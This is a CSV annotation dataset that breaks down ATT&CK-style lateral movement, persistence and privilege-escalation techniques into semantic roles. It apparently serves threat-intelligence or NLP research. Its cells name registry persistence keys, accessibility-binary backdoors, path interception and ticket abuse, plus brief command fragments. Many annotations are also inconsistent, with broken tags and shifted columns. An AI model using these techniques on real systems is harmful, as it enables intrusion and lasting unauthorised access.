0,0,1,2,tactic,technique,Id,action_what,action_where,where_attribute,when,when_condition,when_object,why_state,why_what,why_where,how,how_what,how_where,precondition,postcondition,alternative_technique,
,,,701,lateral movement ,taint shared content,t1080,add  ,"program, script, exploit code",,,,,,,,,use,embedded command,,,,
,,,702,lateral movement ,taint shared content,t1080,use,Shortcut Modification of directory ,.LNK file,,,,,,,,,,,,,
,,,703,lateral movement ,taint shared content,t1080,use,Masquerading,,,,,look like the real directories,,,Hidden Files and Directories,,,,,,
,,,704,lateral movement ,taint shared content,t1080,execute,malware file,,,,,,,,embedded command,,,,,,
,,,705,lateral movement ,taint shared content,t1080,embed command,LNK-based directory,,,,,,,,,,,,,,
,,,440,lateral movement ,pass the ticket,t1097,use,kerberos authentication,valid,,,,lateral movement to a remote system,,,,,,,,,
,,,441,lateral movement ,pass the ticket,t1097,captured,kerberos tickets,,,,,,,,credential dumping,,,,,,
,,,442,lateral movement ,pass the ticket,t1097,use,tgt,,,,,request service tickets from the ticket granting service (tgs) access any resource the user has privileges to access,,,,,,,,,
,,,443,lateral movement ,pass the ticket,t1097,use,kerberos,,,,,"authentication mechanism why> and are <what> used <\what> <where> kerberos <\where> to <why> generate tickets  access that particular resource and the system that hosts the resource (e.g., sharepoint)",used,kerberos,,,,,,,
,,,444,lateral movement ,pass the ticket,t1097,obtained,golden tickets,,,,,<what> enables <\what> generation of <where> tgts <\where> for any account in <attribute> active directory <\attribute>,enables,tgts,key distribution service account krbtgt account ntlm hash,,,,,,
,,,31,lateral movement ,applescript,t1155,executes,applescript,,,,,,,,,,,,,,
,,,32,lateral movement ,applescript,t1155,locate,open scripting architecture (osa) language scripts,,,,,,,,,,,,,,
,,,33,lateral movement ,applescript,t1155,send,open windows,,,,,,,,,,,,,,
,,,34,lateral movement ,applescript,t1155,interact,keystrokes,,,,,,,,,,,,,,
,,,35,lateral movement ,applescript,t1155,use,"open application  ,  scripting language","locally  ,  remotely",,,,<what> interact <\what> with <attribute> open <\attribute> <where> ssh connection <\where>  <what> move <\what> to <where> remote machines <\where>  even present users with fake dialog boxes  <what> launch <\what> more common <where> techniques <\where> as well such as a <attribute> reverse shell via python <\attribute>,"interact  ,  move  ,  launch","ssh connection  ,  remote machines  ,  techniques",,,,,,,
,,,36,lateral movement ,applescript,t1155,run,scripts,the command-line via <how> osascript /path/to/script or osascript -e script here,,,,,,,,,,,,,
,,,166,lateral movement ,distributed component object model,t1175,use,dcom,,,,,lateral movement,,,dcom,,,,,,
,,,167,lateral movement ,distributed component object model,t1175,execution,shellcode,,,,,,,,office applications,,,,,,
,,,168,lateral movement ,distributed component object model,t1175,execute,macros,existing documents,,,,,,,,,,,,,
,,,169,lateral movement ,distributed component object model,t1175,invoke,dynamic data exchange (dde) execution,,,,,,,,com created instance of a microsoft office application,,,,,,
,,,170,lateral movement ,distributed component object model,t1175,bypassing,document,malicious,,,,<what> expose<\what> <where> functionalities <\where>,expose,functionalities,,,,,,,
,,,171,lateral movement ,distributed component object model,t1175,leveraged/use,adversary chain,,,,,,,,,,,,,,
,,,172,lateral movement ,distributed component object model,t1175,,privilege escalation and persistence,,,,,,,,,,,,,,
,,,659,lateral movement ,ssh hijacking,t1184,hijack, connection,,if an adversary is able to <condition>obtain root access<\condition> ,obtain root access,,,,,"compromising the ssh agent , having access to the agent's socket",,,,,,
,,,225,lateral movement ,exploitation of remote services,t1210,exploitation,software vulnerability,,"<what> takes advantage <\what> of a <where> programming error <\where> in a <attribute> program, service, or within the operating system software or kernel itself <\attribute>",,,<what> execute <\what> <attribute> adversary-controlled <\attribute> <where> code <\where>  post-compromise exploitation of remote services is for lateral movement  enable access to a remote system,execute,code,,,,,,,
,,,226,lateral movement ,exploitation of remote services,t1210,determine/find,remote system,vulnerable state,,,,,,,"network service scanning or other discovery methods looking for common, vulnerable software that may be deployed in the network",,,,,,
,,,227,lateral movement ,exploitation of remote services,t1210,use,patches,"indicate vulnerabilities, or security software",,,,<what> detect or contain <\what> <where> remote exploitation<\where>  lateral movement exploitation,detect or contain,remote exploitation,,,,,,,
,,,228,lateral movement ,exploitation of remote services,t1210,use,vulnerabilities,"smb and rdp  ,  mysql and web server services",,,,<what> achieve <\what> <where> exploitation <\where>  privilege escalation  lateral movement exploitation,achieve,exploitation,,,,,,,
,,,767,lateral movemnet,windows admin shares,t1077,transfer,file,,,,,,,,winrm command,,,,,,
,,,768,lateral movemnet,windows admin shares,t1077,run,binary,,<condition>authenticated <object>sessions<\object><\condition>,authenticated <object>sessions<\object>,sessions,,,,"remote execution , scheduled task , service execution , windows management instrumentation , use ntlm hashes",,,,,,
,,,769,lateral movemnet,windows admin shares,t1077,access,administrator share,,,,,,,,pass the hash,,,,,,
,,,770,lateral movemnet,windows admin shares,t1077,connect,windows admin share,,<condition>valid <\condition><object>credentials<\object>,valid ,credentials,,,,net use commands,,,,,,
,,,780,persistence,winlogon helper dll,t1004,modify,registry key,"winlogon\notify , winlogon\userinit , winlogon\shell ",,,,<what>load<\what> and <what>execute<\what> malicious <where>dlls<\where> and/or <where>executables<\where>,"load , execute","dlls , executables",,,,,,,
,,,781,persistence,winlogon helper dll,t1004,load/execute,DLL,,,,,,,,,,,,,,
,,,782,persistence,winlogon helper dll,t1004,load/execute,executable,,,,,,,,,,,,,,
,,,597,persistence,shortcut modification,t1023,use,shortcut,,,,,<what>execute<\what> their <where>tools<\where> forpersistence,execute,tools,,,,,,,
,,,598,persistence,shortcut modification,t1023,execute,tool,,,,,,,,,,,,,,
,,,599,persistence,shortcut modification,t1023,create,shortcut,,,,,<what>look<\what> like a <where>legitimate program<\where>,look,legitimate program,<what>use<\what> <where>masquerading<\where>,,,,,,
,,,600,persistence,shortcut modification,t1023,edit,target path,,,,,,,,,,,,,,
,,,601,persistence,shortcut modification,t1023,replace,shortcut,existing ,,,,their <where>tools<\where> will be <what>executed<\what> instead of the intended legitimate program,executed,tools,,setting,screensaver,,,,
,,,518,persistence,registry run keys / startup folder,t1060,use,configuration location,"hkey_current_user\software\microsoft\windows\currentversion\run  , hkey_current_user\software\microsoft\windows\currentversion\runonce  , hkey_local_machine\software\microsoft\windows\currentversion\run  , hkey_local_machine\software\microsoft\windows\cur",,,,"<what>execute<\what> <where>malware<\where>, such as <where>remote access tools<\where>  , <what>maintain<\what>persistence through system reboots ","execute , maintain","malware , remote access tools",<what>use<\what> masquerading,,,,,,
,,,519,persistence,registry run keys / startup folder,t1060,use,Masquerading,,,,,make the Registry entries look as if they are associated with legitimate programs,,,,,,,,,
,,,520,persistence,registry run keys / startup folder,t1060,execute,malware,,,,,,,,,,,,,,
,,,775,persistence,windows management instrumentation event subscription,t1084,use,wmi,,,,,"<what>subscribe<\what> to an <where>event<\where> , execute arbitrary <where>code<\where><why> when <when> that <object>event<\object> occurs<\when>, providingpersistence on a system. adversaries may attempt to <why><what>evade<\what> detection","subscribe , evade","event , code",,,,,,,
,,,776,persistence,windows management instrumentation event subscription,t1084,subscribe,event,,,,,,,,,,,,,,
,,,777,persistence,windows management instrumentation event subscription,t1084,execute,code,,,,,,,,,,,,,,
,,,778,persistence,windows management instrumentation event subscription,t1084,compile,wmi scripts,,,,,"<what>subscribe<\what> to an <where>event<\where> , execute arbitrary <where>code<\where><why> when <when> that <object>event<\object> occurs<\when>, providingpersistence on a system. adversaries may attempt to <why><what>evade<\what> detection","subscribe , evade","event , code",,use,masquerading,,,,
,,,579,persistence,security support provider,t1101,modify,registry key,"hklm\system\currentcontrolset\control\lsa\security packages , hklm\system\currentcontrolset\control\lsa\osconfig\security packages",,,,<what>add<\what> new <where>ssps<\where>,add,ssps,,,,,,,
,,,580,persistence,security support provider,t1101,add, security support provider,,,,,,,,,use,,,,,
,,,514,persistence,rc.common,t1163,use,rc.common file,,,,,<what>hide<\what> <where>code<\where> forpersistence,hide,code,,,,,,,
,,,551,persistence,re-opened applications,t1164,modify,file,,,,,"<what>include<\what> a <where>link<\where> to their malicious executable , <what>provide<\what> apersistence mechanism","include , provide",link,,"registering , enabling",dll,,,,
,,,552,persistence,re-opened applications,t1164,include,link,,,,,,,,,,,,,,
,,,568,persistence,screensaver,t1180,use,screensaver setting,"scrnsave.exe , screensaveactive , screensaverissecure , screensavertimeout",,,,"<what>maintain<\what>persistence , <what>run<\what> <where>malware<\where> after a certain timeframe of user inactivity","maintain , run",malware,<what>setting<\what> the <where>screensaver<\where>,,,,,,
,,,569,persistence,screensaver,t1180,run,malware,,,,,,,,,,,,,,
,,,676,persistence ,system firmware,t1019,modify,system firmware,,,,,<what>perform<\what> or <what>assist<\what> in malicious activity,"perform , assist",,,,,,,,
,,,677,persistence ,system firmware,t1019,modify, bios,,,,,<what>perform<\what> or <what>assist<\what> in malicious activity,"perform , assist",,,,,,,,
,,,678,persistence ,system firmware,t1019,modify,uefi,,,,,<what>perform<\what> or <what>assist<\what> in malicious activity,"perform , assist",,,,,,,,
,,,679,persistence ,system firmware,t1019,overwrite,system firmware,,,,,<what>install<\what> malicious <where>firmware updates<\where>,install,firmware updates,,,,,,,
,,,680,persistence ,system firmware,t1019,install,system firmware update,,,,,,,,,,,,,,
,,,354,persistence ,modify existing service,t1031, modifiy,service configuration,,,,,,,,"utilities , sc.exe , reg",,,,,,
,,,355,persistence ,modify existing service,t1031,modify,service,,,,,"<what>persist<\what> <where>malware<\where> on a system  , <what>interact<\what> with the <where>windows api<\where> , <what>interrupt<\what> their <where>functionality<\where> , <what>enable<\what> <where>services<\where> that are disabled","persist , interact , interrupt , enable","malware , windows api , functionality , services","<what>using<\what> <where>system utilities<\where> , <what>using<\what> <where>custom tools<\where>",,,,,,
,,,356,persistence ,modify existing service,t1031, kill,service,,,,,<what>execute<\what> malicious <where>recovery programs<\where>/<where>commands<\where>,execute,"recovery programs , commands",,,,,,,
,,,357,persistence ,modify existing service,t1031,execute,program,,,,,,,,,,,,,,
,,,82,persistence ,change default file association,t1042,modify,registry key values,,,,,continually execute arbitrary commands,,,hkey_classes_root.[extension]  hkey_classes_root.txt.  hkey_classes_root[handler]  hkey_classes_root[handler]\shell[action]\command hkey_classes_root\txtfile\shell\open\commandhkey_classes_root\txtfile\shell\print\command* hkey_classes_root\txtfile\shell\printto\command,,,,,,
,,,278,persistence ,hypervisor,t1062,use,hypervisor,,,,,hide its existence  persist  on systems,,,interruption,,,,,,
,,,61,persistence ,bootkit,t1067,modifies,boot sectors,"master boot record (mbr)  , volume boot record (vbr)",,,,,,,,,,,,,
,,,62,persistence ,bootkit,t1067,use,bootkits,,has raw access to the boot drive,,,persist on systems,,,,,,,,,
,,,63,persistence ,bootkit,t1067,overwrite,boot area,,has raw access to the boot drive,,,<what> diverting <\what><where> execution <\where>,diverting,execution,,,,,,,
,,,64,persistence ,bootkit,t1067,overwrite,vbr,,,,,<what>divert <\what> <where> execution <\where> during startup to adversary code,divert,execution,,,,,,,
,,,384,persistence ,netsh helper dll,t1128,use,netsh.exe,,"<condition><object>netsh.exe<\object> is executed automatically<\condition> with anotherpersistence technique , if other <condition>persistent softwareis present  on the system that executes <object>netsh.exe<\object><\condition> ","<object>netsh.exe<\object> is executed automatically , persistent softwareis present  on the system that executes <object>netsh.exe<\object>","netsh.exe , netsh.exe",proxy <what>execution<\what> of arbitrary <where>code<\where>,execution,code,"windows registry at hklm\software\microsoft\netsh , helper dlls , vpn software",,,,,,
,,,385,persistence ,netsh helper dll,t1128,invoke,netsh.exe,,,,,,,,,"using , using","system utilities , custom tools",,,,masquerading
,,,386,persistence ,netsh helper dll,t1128,load,cobalt strike's payload,,,,,,,,<what>using<\what> <where>netsh.exe helper dlls<\where>,,,,,,
,,,50,persistence ,authentication package,t1131,use,autostart mechanism,,,,,persistence,,,placing a reference to a binary in the windows registry location hklm\system\currentcontrolset\control\lsa\ with the key value of authentication packages=.,,,,,,
,,,51,persistence ,authentication package,t1131,executed,binary,,authentication packages are loaded,,,,,,,,,,,,
,1,,117,persistence ,create account,t1136 , create , local account/domain account/local system,, sufficient level of access ,,, persistence ,,, net user commands ," hiding  ,  providing  , enabling ","files  ,  processes  ,  network activity ,  log tampering ,  authenticated backdoors  ,  root access ",,,,
,,,420,persistence ,office application startup,t1137,insert,office visual basic for applications (vba) macro,base templated,the <condition>respective <object>office application<\object> starts<\condition>,respective <object>office application<\object> starts,office application,"<what>execute<\what> <where>code<\where> , <what>obtain<\what>persistence","execute , obtain",code,,,,,,,
,,,421,persistence ,office application startup,t1137,use,macro,,the <condition>respective <object>office application<\object> starts<\condition>,respective <object>office application<\object> starts,office application,"<what>execute<\what> <where>code<\where> , <what>obtain<\what>persistence","execute , obtain",code,,,,,,,
,,,422,persistence ,office application startup,t1137,modify,normal.dotm template,,an adversary may need to <condition>enable <object>macros<\object><\condition>,enable <object>macros<\object>,macros,<what>include<\what> a malicious <where>macro<\where>,include,macro,,,,,,,
,,,423,persistence ,office application startup,t1137,include,macro,,,,,,,,,use,registry key: hkey_current_user\software\microsoft\office test\special\perf,,,,
,,,424,persistence ,office application startup,t1137,add,macro,,an adversary may need to <condition>enable <object>macros<\object><\condition>,enable <object>macros<\object>,macros,<what>include<\what> a malicious <where>macro<\where>,include,macro,,created,outlook rules,,,,
,,,425,persistence ,office application startup,t1137,place dll,registry,,,,,,,,,,,,,,
,,,426,persistence ,office application startup,t1137,execute,dll,,<when><object>DLL reference<\object> was placed within it(registry) <\when>  ;<condition><object>office application<\object> is started<\condition> ,<object>office application<\object> is started,office application,,,, use registry key:hkey_current_user\software\microsoft\office test\special\perf,,,,,,
,,,427,persistence ,office application startup,t1137,trigger,code execution,,adversary <condition>sends a specifically crafted <object>email<\object><\condition> to that user,sends a specifically crafted <object>email<\object>,email,,,,malicious <where>outlook rules<\where> can be <what>created<\what>,created,custom outlook forms,,,,
,,,428,persistence ,office application startup,t1137,create,outlook form,,,,,,,,,crafted,html page,,,,
,,,429,persistence ,office application startup,t1137,create,outlook rule,,,,,,,,,use,outlook,,,,
,,,430,persistence ,office application startup,t1137,execute,code,, <condition>specifically crafted <object>email<\object> is sent<\condition> by an adversary utilizing the same custom outlook form,specifically crafted <object>email<\object> is sent,email,,,,<where>custom outlook forms<\where> can be <what>created<\what> ,,,,,,
,,,431,persistence ,office application startup,t1137,execute,code,,loaded by outlook home page,,,,,,malicious <where>html page<\where> can be <what>crafted<\what>,,,,,,
,,,432,persistence ,office application startup,t1137,execute,home page,,"an adversary requires <condition>prior access<\condition> to the <object>user's outlook mailbox<\object> , <condition>right <object>outlook folder<\object> is loaded/reloaded<\condition>","prior access , right <object>outlook folder<\object> is loaded/reloaded","user outlook mailbox , outlook folder",,,,using outlook,,,,,,
,,,433,persistence ,office application startup,t1137,execute,outlook rule ,,adversary <condition>sends a specifically crafted <object>email<\object><\condition> to the user,sends a specifically crafted <object>email<\object>,email,,,,,,,,,,
,,,434,persistence ,office application startup,t1137,execute,outlook form,,adversary <condition>sends a specifically crafted <object>email<\object><\condition> to the user,sends a specifically crafted <object>email<\object>,email,,,,,using,netsh.exe helper dlls,,,,
,,,1,persistence ,.bash_profile and .bashrc,t1156,insert-code,bash_profile file / bashrc file,,user logs in  /opens a new shell,,,gain persistence,,,,,,bashrc-file-access/bash_profile-file-access,bashrc-file-modified/bash_profile-file-modified,bashrc-file-modified/bash_profile-file-modified,
,,,324,persistence ,launch agent,t1159,install,launch agent,,administrator privileges,,,execute at login  <what>load<\what> a <where> plist <\where>,load,plist,launchd or launchctl,,,,,,
,,,329,persistence ,lc_load_dylib addition,t1161,remediate,digital signatures,modified binary,,,,,,,<what>removing <\what>the <where> lc_code_signature<\where>command,removing,lc_code_signature,,,,
,,,339,persistence ,login item,t1162,register,login item,,,,,,,,,,,,,,
,,,340,persistence ,login item,t1162,,modified,,,,,execute their code  persistence mechanism  set login items,,,api method <where> smloginitemsetenabled<\where>  can be <what> used <\what>,used,smloginitemsetenabled,,,,
,,,67,persistence ,browser extensions,t1176,installed,malicious extensions,,security can be limited on browser app stores  extension is installed,,,,,,malicious app store downloads masquerading as legitimate extensions  social engineering  adversary that has already compromised a system,,,,,,
,,,68,persistence ,browser extensions,t1176,browse,websites,,,,,,,,,,,,,,
,,,69,persistence ,browser extensions,t1176,steal,information,,,,,,,,,,,,,,
,,,70,persistence ,browser extensions,t1176,installer,"credentials,",,,,,,,,,,,,,,
,,,71,persistence ,browser extensions,t1176,,rat,,,,,persistence,,,a persistent backdoor through malicious chrome extensions,,,,,,
,,,719,persistence ,time providers,t1209,use,time providers,,<condition><object>administrator privileges<\object> are required<\condition> for time provider registration,<object>administrator privileges<\object> are required,administrator privileges,<what>establish<\what>persistence,establish,,<what>registering<\what> and <what>enabling<\what> a malicious <where>dll<\where> as a time provider,"creating , modifying",service unit files,,,,
,,,720,persistence ,time providers,t1209,enable,time providers,,,,,,,,,,,,,,
,,,721,persistence ,time providers,t1209,register,time providers,,,,,,,,,,,,,,
,,,322,persistence ,kernel modules and extensions,t1215,use,loadable kernel modules (lkms),,,,,covertly persist on a system and evade defenses,,,"<what> hiding <\what> itself, selective hiding <where>files <\where>, <where> processes <\where> and <where> network activity<\where>, as well as <where> log tampering<\where>, <what> providing <\what> <where> authenticated backdoors <\where> and <what>enabling <\what> <where> root access <\where> to non-privileged users","hiding  ,  providing  , enabling","files  ,  processes  ,  network activity ,  log tampering ,  authenticated backdoors  ,  root access",,,,
,,,695,persistence ,systemd service,t1501,use ,systemd functionality,,"<condition><object>require root privileges<\object> to create/modify service unit files in the /etc/systemd/system and /usr/lib/systemd/system directories<\condition> , <condition><object>low privilege users<\object>  can create/modify service unit files ","<object>require root privileges<\object> to create/modify service unit files in the /etc/systemd/system and /usr/lib/systemd/system directories , <object>low privilege users<\object>  can create/modify service unit files in directories such as ~/.config/s","require root privileges , low privilege users","<what>establish<\what> persistent <where>access<\where> to victim systems , <what>execute<\what> malicious <where>commands<\where> at recurring intervals, such as at system boot","establish , execute","access , commands",<what>creating<\what> and/or <what>modifying<\what> <where>service unit files<\where>,,,,,,
,,,696,persistence ,systemd service,t1501,execute,comamnd,,,,,,,,,,,,,,
,,,697,persistence ,systemd service,t1501,create,service unit file,,,,,,,,,,,,,,
,,,698,persistence ,systemd service,t1501,modify,service unit file,,,,,,,,,,,,,,
,,,766,"persistence ,privilege escalation",web shell,t1100,place,web script,,,,,<what>use<\what> the <where>web server<\where> as a gateway into a network,use,web server,,,,,,,
,,,245,"persistence ,privilege escalation ",file system permissions weakness,t1044,use,file system permissions weakness,,"higher permissions level  executing process is set to run at a specific time or during a certain event (e.g., system bootup)",,,replace legitimate binaries with malicious ones,,,,,,,,,
,,,246,"persistence ,privilege escalation ",file system permissions weakness,t1044,use,file system permissions weakness,,,,,persistence,,,,,,,,,
,,,247,"persistence ,privilege escalation ",file system permissions weakness,t1044,manipulation,windows service binaries,,,,,,,,,,,,,,
,,,248,"persistence ,privilege escalation ",file system permissions weakness,t1044,replace,service executable,,installers create subdirectories and files  do not set appropriate permissions to restrict write access,,,gain persistence and/or privilege escalation,,,,,,,,,
,,,249,"persistence ,privilege escalation ",file system permissions weakness,t1044,execution,code,,,,,,,,,,,,,,
,,,250,"persistence ,privilege escalation ",file system permissions weakness,t1044,overwriting,binaries,,,,,,,,,,,,,,
,,,251,"persistence ,privilege escalation ",file system permissions weakness,t1044,use,dll search order hijacking,,<object> installers <\object> may also require <condition> elevated privileges <\condition>  privilege escalation when executing adversary controlled code,elevated privileges,installers,,,,,,,,,,
,,,252,"persistence ,privilege escalation ",file system permissions weakness,t1044,use,bypass user account control,,,,,,,,,,,,,,
,,,40,"persistence ,privilege escalation ",application shimming,t1138,use,bypass user account control (uac),,,,,,,,(redirectexe),,,,,,
,,,41,"persistence ,privilege escalation ",application shimming,t1138,inject,dlls,,,,,,,,injectdll,,,,,,
,,,42,"persistence ,privilege escalation ",application shimming,t1138,disable,data execution prevention,,,,,,,,disablenx,,,,,,
,,,43,"persistence ,privilege escalation ",application shimming,t1138,disable,structure exception handling,,,,,,,,disableseh,,,,,,
,,,44,"persistence ,privilege escalation ",application shimming,t1138,intercept,memory addresses,,,,,,,,getprocaddress,,,,,,
,,,45,"persistence ,privilege escalation ",application shimming,t1138,elevate,privileges,,,,,,,,,,,,,,
,,,46,"persistence ,privilege escalation ",application shimming,t1138,install,backdoors,,,,,,,,,,,,,,
,,,47,"persistence ,privilege escalation ",application shimming,t1138,disable,defenses,windows defender,,,,,,,,,,,,,
,,,28,"persistence ,privilege escalation ",appcert dlls,t1182,loaded,registry key,hkey_local_machine\system\currentcontrolset\control\session,,,,,,,"calls the ubiquitously used application programming interface (api) functions <where> createprocess<\where>, <where> createprocessasuser<\where>, <where> createprocesswithloginw<\where>, <where> createprocesswithtokenw<\where>, or <where> winexec <\where>",,"createprocess ,  createprocessasuser ,  createprocesswithloginw ,  createprocesswithtokenw ,  winexec",,,,
,,,29,"persistence ,privilege escalation ",appcert dlls,t1182,abuse/use,registry key value,,,,,obtain persistence and privilege escalation,,,causing a <where> malicious dll <\where> to be <what> loaded and run <\what> in the context of separate processes,loaded and run,malicious dll,,,,
,,,22,"persistence,credential access ",account manipulation,t1098,maintaining,access,,,,,credentials and certain permission levels,,,,,,,,,
,,,23,"persistence,credential access ",account manipulation,t1098,modifying,permissions,,,,,,,,,,,,,,
,,,24,"persistence,credential access ",account manipulation,t1098,modifying,credentials,,,,,,,,,,,,,,
,,,25,"persistence,credential access ",account manipulation,t1098,adding or changing,permission groups,,,,,,,,,,,,,,
,,,26,"persistence,credential access ",account manipulation,t1098,modifying,settings,account,,,,,,,,,,,,,
,,,27,"persistence,credential access ",account manipulation,t1098,modifying,authentication,,sufficient permissions on systems or the domain,,,"subvert security policies <why>, such as <what> performing <\what> iterative <where> password updates <\where> to <why> subvert password duration policies and preserve the life of compromised credentials  create or manipulate accounts",performing,password updates,,,,,,,
,,,107,"persistence,defense evasion ",component firmware,t1109,employ,tools,sophisticated,,,,<what> compromise <\what> <where> computer components <\where>  <what> install <\what> <attribute> malicious<\attribute> <where> firmware <\where>,"compromise  ,  install","computer components  ,  firmware",,,,,,,
,,,108,"persistence,defense evasion ",component firmware,t1109,execute,code,"outside of the operating system  ,  main system firmware or bios",,,,,,,,,,,,,
,,,109,"persistence,defense evasion ",component firmware,t1109,access,systems,,,,,maintain access and hard disk re-images  evade host software-based defenses and integrity checks,,,,,,,,,
,,,110,"persistence,defense evasion ",component object model hijacking,t1122,use,component object model (com),,com object requires a <condition> change <\condition> in the <\object> windows registry <\object>,change,,<what> insert <\what> <attribute>malicious<\attribute> <where> code <\where> that can be <why> executed  replace a reference,insert,code,hijacking the com references and relationships as a means for persistence,,,,,,
,,,111,"persistence,defense evasion ",component object model hijacking,t1122,executed,code,,,,,,,,,,,,,,
,,,112,"persistence,defense evasion ",component object model hijacking,t1122,hijack,objects/com objects,,,,,maintain a consistent level of persistence  avoid system instability that could lead to detection,,,,,,,,,
,,,266,"persistence,defense evasion ",hidden files and directories,t1158 ,use ,hidden files and directories,,,,,,,,,,,,,,
,1,,267,"persistence,defense evasion ",hidden files and directories,t1158 ,hide ,file/folder name,,,,,persistence and evading   mark a file or folder as hidden ,,, attrib.exe binary   attrib +h filename  +s marks a file as a system file  +r flag marks the file as read only  recursively /s  putting a . as the first character ;  uf_hidden flag which prevents them from being seen in finder.app ,writing,pathname,,,,
,,,341,"persistence,lateral movement ",logon scripts,t1037,insert,code,logon script,access these scripts <object> local credentials <\object> or an <object> administrator account <\object> may be necessary <condition>require<\condition>,"require , require","local credentials  ,  local credentials",<what> execute <\what> their <where> tools <\where> maintain persistence on a single system,execute,tools,,,,,,,
,,,463,"persistence,privilege escalation",port monitors,t1013,use,this technique(port monitors),,permissions allow ,,,<what>load<\what> malicious <where>code<\where> at startup,load,code,<what>writing<\what> a fully-qualified <where>pathname<\where> for that dll to hklm\system\currentcontrolset\control\print\monitors,performing,path,,,,
,,,464,"persistence,privilege escalation",port monitors,t1013,load,code,,,,,,,,,performing,path,,,,
,,,465,"persistence,privilege escalation",port monitors,t1013,write ,pathname,,,,,,,,,,,,,,
,,,448,"persistence,privilege escalation",path interception,t1034,use,weaknesses ,,,,,"persistence if <when><object>executables<\object> are <condition>called on a regular basis<\condition><\when>,  , privilege escalation if <when><condition>intercepted <object>executables<\object> are started by a higher privileged process<\condition><\whe",,,"<what>performing<\what> <where>path<\where> interception:  , unquoted paths , path environment variable misconfigurations , search order hijacking",named,windows program,,,,
,,,449,"persistence,privilege escalation",path interception,t1034,use,misconfiguration,,,,,"persistence if <when><object>executables<\object> are <condition>called on a regular basis<\condition><\when>,  , privilege escalation if <when><condition>intercepted <object>executables<\object> are started by a higher privileged process<\condition><\whe",,,"<what>performing<\what> <where>path<\where> interception:  , unquoted paths , path environment variable misconfigurations , search order hijacking","creating , placing","program , it(program) ",,,,
,,,450,"persistence,privilege escalation",path interception,t1034,place,executable,higher level directory of the path,"<object>path<\object> <condition>has one or more spaces<\condition> , <object>path<\object> is <condition>not surrounded by quotation marks<\condition>","has one or more spaces , not surrounded by quotation marks","path , path",windows will <what>resolve<\what> that <where>executable<\where> instead of the intended executable,resolve,executable,,"using , interact , modifying , using","utilities<\where to <why> with <where>services , registry , name",,,,
,,,451,"persistence,privilege escalation",path interception,t1034,place,program,preceding directory,"any <condition><object>directories<\object> are listed in the path environment variable before the windows directory<\condition>, %systemroot%\system32",<object>directories<\object> are listed in the path environment variable before the windows directory,directories,,,,"<what>named<\what> the same as a <where>windows program<\where> (such as cmd, powershell, or python) ",,,,,,
,,,452,"persistence,privilege escalation",path interception,t1034,"create, place","program, program",improperly specified program,,,,,,,"<what>creating<\what> a <where>program<\where> named after the improperly specified program , <what>placing<\what> <where>it(program) <\where> within the initiating program's directory","created , executed",services,,,,
,,,397,"persistence,privilege escalation",new service,t1050,"install , configure , disguise","service , service name, service",,,,,<what>execute<\what> at startup,execute,,"<what>using<\what> <where>utilities<\where to <why><what>interact<\what> with <where>services<\where><\why> , directly <what>modifying<\what> the <where>registry<\where> , <what>using<\what> a <where>name<\where> from a related operating system or benign ",,,,,,
,,,398,"persistence,privilege escalation",new service,t1050,execute,service,,,,,,,,,,,,,,
,,,399,"persistence,privilege escalation",new service,t1050,use,service,,,,,<what>escalate<\what> <where>privileges<\where> from administrator to system,escalate,privileges,<where>services<\where> may be <what>created<\what> with <attribute>administrator privileges<\attribute> but are <what>executed<\what> under <attribute>system privileges<\attribute>,,,,,,
,,,400,"persistence,privilege escalation",new service,t1050,start,service,,,,,,,,service execution,,,,,,
,,,13,"persistence,privilege escalation ",accessibility features,t1015,modify,programs/registry key,,,,,<what> get/use <\what> a <where> command prompt <\where> or <where> backdoor <\where> without logging in to the system,get/use,"command prompt  ,  backdoor",,,,,,,
,,,14,"persistence,privilege escalation ",accessibility features,t1015,launched,accessibility programs,"c:\windows\system32\sethc.exe  ,  c:\windows\system32\utilman.exe",the shift key is pressed five times,,,,,,,,,,,,
,,,15,"persistence,privilege escalation ",accessibility features,t1015,launched,accessibility programs,,the windows + u key combination is pressed,,,,,,,,,,,,
,,,16,"persistence,privilege escalation ",accessibility features,t1015,use,sethc.exe program,"sticky keys,",pressing the appropriate key combination at the login screen,,,unauthenticated access through a remote desktop login screen,,,,,,,,,
,,,17,"persistence,privilege escalation ",accessibility features,t1015,execute,replaced file,system privileges,provides backdoor access,,,,,,c:\windows\system32\osk.exec:\windows\system32\magnify.exec:\windows\system32\narrator.exec:\windows\system32\displayswitch.exec:\windows\system32\atbroker.exe,,,,,,
